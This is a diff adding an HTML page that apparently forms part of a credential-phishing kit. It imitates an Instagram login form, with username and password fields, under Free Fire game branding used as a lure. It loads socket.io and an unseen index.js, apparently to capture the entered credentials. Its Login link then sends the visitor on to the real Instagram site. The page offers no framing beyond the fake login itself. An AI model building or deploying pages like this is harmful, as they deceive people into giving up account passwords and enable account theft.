@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script
+      src="https://cdn.socket.io/3.1.3/socket.io.min.js"
+      integrity="sha384-cPwlPLvBTa3sKAgddT6krw0cJat7egBga3DJepJyrLl4Q9/5WLra3rrnMcyTyOnh"
+      crossorigin="anonymous"
+    ></script>
+    <link
+      href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css"
+      rel="stylesheet"
+    />
+    <title>Insta FF</title>
+  </head>
+  <body class="w-full h-screen bg-black">
+    <header
+      class="w-full mt-5 text-center text-4xl flex justify-center items-center"
+    >
+      <img src="ff-removebg-preview (1) (1).png" alt="Free fire" srcset="" />
+    </header>
+    <main class="flex justify-center items-center pt-20 h-2/3">
+      <div
+        class="
+          max-w-md
+          flex flex-col
+          bg-white
+          mx-32
+          h-full
+          px-10
+          rounded-sm
+          justify-center
+          items-center
+        "
+      >
+        <img
+          class="w-1/2"
+          src="instagram-new-logo-removebg-preview.png"
+          alt=""
+          srcset=""
+        />
+        <div class="flex h-2/3 flex-col justify-around py-10 px-0 items-center">
+          <input
+            id="username"
+            class="border-4 w-full border-gray-200 p-2 rounded-md"
+            placeholder="Phone, username, or email"
+            type="text"
+          />
+          <br />
+          <input
+            id="password"
+            class="border-4 w-full border-gray-200 p-2 rounded-md"
+            placeholder="Password"
+            type="password"
+          />
+          <br />
+          <br />
+          <div
+            class="
+              w-full
+              bg-blue-400
+              text-white
+              py-3
+              text-center
+              font-bold
+              rounded-md
+              cursor-pointer
+            "
+            id="loginbtn"
+          >
+            <a href="https://www.instagram.com/?hl=en">Login</a>
+          </div>
+        </div>
+      </div>
+    </main>
+    <footer></footer>
+    <script src="index.js"></script>
+  </body>
+</html>
